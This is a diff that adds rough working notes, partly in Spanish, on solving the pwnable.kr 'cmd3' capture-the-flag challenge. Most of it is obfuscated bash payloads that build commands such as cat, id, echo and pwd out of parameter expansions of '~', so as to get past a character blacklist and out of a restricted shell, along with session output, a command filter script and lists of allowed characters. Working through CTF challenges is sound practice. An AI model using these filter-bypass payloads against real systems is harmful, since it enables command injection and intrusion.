@@ -1,0 +1,110 @@
+
+
+
+__=	blacklist = '` !&|"\'*'
+
+${#var}
+
+__=~
+___=??????
+____=?
+${__:${#___}:${#____}}
+
+__=~;___=??????;____=?;${__:${#___}:${#____}}
+__=~;___=??????;____=?;${__:${#___}:${#____}}?? -> cat
+__=~;___=??????;____=?;$(${__:${#___}:${#____}}??)
+
+$ var=/home/cmd3_pwn
+user@kali:~/repositorios/pwnable/cmd3$ echo ${var:8:1}
+__=~
+___=????????
+____=?
+${__:${#___}:${#____}}
+
+__=~;___=????????;____=?;${__:${#___}:${#____}}
+__=~;___=????????;____=?;?${__:${#___}:${#____}} -> id
+
+
+
+__=~;___=????????????;____=?;${__:${#___}:${#____}}
+
+
+$ nc pwnable.kr 9023
+total 5344
+drwxr-x---  5 root cmd3_pwn    4096 Mar 15  2016 .
+drwxr-xr-x 93 root root        4096 Oct 10 22:56 ..
+d---------  2 root root        4096 Jan 22  2016 .bash_history
+-rwxr-x---  1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py
+drwx-wx---  2 root cmd3_pwn   24576 Oct 22 12:01 flagbox
+drwxr-x---  2 root cmd3_pwn    4096 Jan 22  2016 jail
+-rw-r--r--  1 root root     5422608 Oct 22 12:01 log
+-rw-r-----  1 root root         764 Mar 10  2016 super.pl
+total 8
+drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
+drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..
+lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
+lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
+lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
+your password is in flagbox/9ZKB06BIMJ7Q5MSTCDFNQQB9J4XB18BA
+cmd3$ ~
+/bin/rbash: line 1: /home/cmd3_pwn: restricted: cannot specify `/' in command names
+cmd3$ 
+
+
+
+for comando in comandos:
+    for i in range(len(comando)):
+        if comando[i] not in abcdario:
+            break
+    else:
+        print(comando)
+
+
+
+
+CARACTERES PERMITIDOS
+# $ % ( ) + , - . / : ; < = > ? @ [ \ ] ^ _ { } ~
+
+LETRAS QUE TENEMOS
+h o m e c d p w n
+
+COMANDOS QUE TENEMOS
+ls cat id
+
+BUILT INS COMMANDS
+'history', 'if', 'jobs', 'kill', 'let', 'local', 'logout', 'mapfile', 'popd', 'printf', 'pushd', 'pwd', 'read', 'readarray', 'readonly', 'return', 'select', 'set', 'shift', 'shopt', 'source', 'suspend', 'test', 'time', 'times', 'trap', 'true', 'type', 'typeset', 'ulimit', 'umask', 'unalias', 'unset', 'until', 'variables', 'wait', 'while', 'alias', 'bg', 'bind', 'break', 'builtin', 'caller', 'case', 'cd', 'command', 'compgen', 'complete', 'compopt', 'continue', 'coproc', 'declare', 'dirs', 'disown', 'echo', 'enable', 'eval', 'exec', 'exit', 'export', 'false', 'fc', 'fg', 'for', 'for', 'function', 'getopts', 'hash', help
+
+BUILT INS QUE PODEMOS ESCRIBIR
+popd, pwd, cd, echo
+
+BUILT INS QUE PODEMOS CORRER
+pwd, echo
+
+
+
+E
+__=~;___=????;____=?;${__:${#___}:${#____}}
+C
+__=~;___=??????;____=?;${__:${#___}:${#____}}
+H
+__=~;___=?;____=?;${__:${#___}:${#____}}
+O
+__=~;___=??;____=?;${__:${#___}:${#____}}
+
+ECHO
+__=~;___=?;____=????;_____=??????;______=??;${__:${#____}:${#___}}${__:${#_____}:${#___}}${__:${#___}:${#___}}${__:${#______}:${#___}}
+
+echo mas corto
+__=~;___=?;____=????;_____=??????;______=??;${__:${#____}:${#___}}${__:${#_____}:${#___}}${__:${#___}:${#______}}
+
+
+
+/home/cmd3_pwn
+
+PW
+__=~;___=???????????;____=??;${__:${#___}:${#____}}
+D
+__=~;___=????????;____=?;${__:${#___}:${#____}}
+
+PWD
+__=~;___=???????????;____=????????;_____=?;______=??;${__:${#___}:${#______}}${__:${#____}:${#_____}}
